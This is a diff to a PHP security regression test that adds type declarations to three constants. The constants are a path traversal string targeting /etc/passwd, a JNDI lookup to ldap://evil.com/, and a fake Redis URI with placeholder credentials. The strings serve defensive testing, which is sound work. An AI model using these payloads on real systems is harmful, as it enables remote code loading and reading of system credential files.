@@ -49,9 +49,9 @@ class SecurityRegressionTest extends TestCase
 {
     use TestHelpers;
 
-    private const MALICIOUS_PATH_PASSWD = '../../../etc/passwd';
-    private const MALICIOUS_PATH_JNDI = '${jndi:ldap://evil.com/}';
-    private const FAKE_REDIS_CONNECTION = 'redis://fake-test-user:fake-test-pass@example.test:6379';
+    private const string MALICIOUS_PATH_PASSWD = '../../../etc/passwd';
+    private const string MALICIOUS_PATH_JNDI = '${jndi:ldap://evil.com/}';
+    private const string FAKE_REDIS_CONNECTION = 'redis://fake-test-user:fake-test-pass@example.test:6379';
 
     #[\Override]
     protected function setUp(): void
